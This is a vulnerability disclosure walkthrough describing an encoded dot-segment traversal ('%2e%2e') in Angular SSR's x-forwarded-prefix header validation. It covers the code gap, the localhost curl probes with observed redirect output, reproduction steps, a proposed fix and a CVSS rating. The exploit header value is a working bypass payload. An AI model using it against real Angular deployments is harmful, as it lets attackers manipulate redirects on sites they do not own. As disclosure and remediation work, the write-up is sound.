# Candidate 21 Walkthrough: `x-forwarded-prefix` Encoded Dot-Segment Traversal

## 1. Invariant Claimed

Angular claims `x-forwarded-prefix` cannot carry traversal because `INVALID_PREFIX_REGEX` rejects `.` / `..` path segments during request validation at [packages/angular/ssr/src/utils/validation.ts:32]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/validation.ts:32 ) and [packages/angular/ssr/src/utils/validation.ts:287]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/validation.ts:287 ).

## 2. Code-Level Gap

The framework validates the raw header string, not the decoded path semantics. `cloneRequestAndPatchHeaders()` only strips leading slashes and leaves encoded bytes untouched at [packages/angular/ssr/src/utils/validation.ts:108]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/validation.ts:108 ). The redirect sink later concatenates the unchecked prefix into `Location` with `joinUrlParts(prefix, buildPathWithParams(...))` at [packages/angular/ssr/src/app.ts:195]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/app.ts:195 ). No decode-normalize-revalidate step exists between those two points.

## 3. Parser Quirk

`%2e%2e` is not matched by the regex, but current WHATWG URL parsing treats it as a dot-segment. On Node/Chromium, `new URL('/foo/%2e%2e/bar/home', 'https://example.com/go').pathname` becomes `/bar/home`, so prefix containment is lost after the header has already passed validation.

## 4. Realistic Consumer Pattern

The proof app is the stock `ng new --ssr` scaffold with a normal Angular router redirect:

- Angular documents `redirectTo: 'user/:name'` as a standard route pattern at [/tmp/r3-main/node_modules/@angular/router/types/_router_module-chunk.d.ts:2048]( /tmp/r3-main/node_modules/@angular/router/types/_router_module-chunk.d.ts:2048 ).
- The PoC route is a minimal equivalent at [/tmp/r3-main/src/app/app.routes.ts:4]( /tmp/r3-main/src/app/app.routes.ts:4 ).
- `allowedHosts` is set in the standard builder config at [/tmp/r3-main/angular.json:16]( /tmp/r3-main/angular.json:16 ).

## 5. Framework-Internal Consumer Check

The request hits a static redirect route (`/go -> /home`), Angular prepends `X-Forwarded-Prefix` in [packages/angular/ssr/src/app.ts:195]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/app.ts:195 ), and `createRedirectResponse()` commits the resulting `Location` header at [packages/angular/ssr/src/utils/redirect.ts:64]( /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/targets/angular-cli/packages/angular/ssr/src/utils/redirect.ts:64 ).

## 6. Three-Probe Isolation

Baseline:

```bash
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: /safe'
```

Observed:

```text
HTTP/1.1 302 Found
location: /safe/home
```

Exploit:

```bash
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/%2e%2e/bar'
```

Observed:

```text
HTTP/1.1 302 Found
location: /foo/%2e%2e/bar/home
```

Current Chromium follows the same `Location` string to `/bar/home`:

```bash
'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' \
  --headless=new --disable-gpu --virtual-time-budget=4000 \
  --dump-dom http://127.0.0.1:4311/start
```

Observed:

```html
<title>bar-home</title><main>bar-home</main>
```

Control:

```bash
curl -si http://127.0.0.1:4300/go -H 'Host: example.com' -H 'X-Forwarded-Prefix: foo/../bar'
```

Observed:

```text
HTTP/1.1 400 Bad Request
Header "x-forwarded-prefix" must not start with "\" or multiple "/" or contain ".", ".." path segments.
```

## 7. How To Verify Yourself

1. Build the stock SSR app in `/tmp/r3-main` with `npm run build`.
2. Run `PORT=4300 node dist/xfh-comma-leak/server/server.mjs`.
3. Repeat the three `curl` probes above.
4. Replay `/foo/%2e%2e/bar/home` through a one-shot local redirect server and open it with Chromium headless; the browser lands on `/bar/home`.

## 8. What The Bug Is Not

- Not raw `../`: the direct dot-segment case is blocked.
- Not a host allowlist bypass: `allowedHosts` still works.
- Not duplicate of Findings #1/#2/#3: this primitive uses `x-forwarded-prefix`, not host reconstruction.

## 9. Proposed Fix

Decode and canonicalize `x-forwarded-prefix` once before validation, then reject if the decoded path contains dot-segments, encoded slashes/backslashes, or re-serializes differently from the input. A simpler hardening option is to reject `%` in this header entirely unless Angular wants to explicitly support encoded prefixes.

## 10. CVSS Justification

Suggested CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` = 5.3.

The attacker only needs a single HTTP request. The effect is redirect-path manipulation within the origin or mounted proxy path, which is an integrity impact on navigation/routing, but I did not prove confidentiality or availability impact.
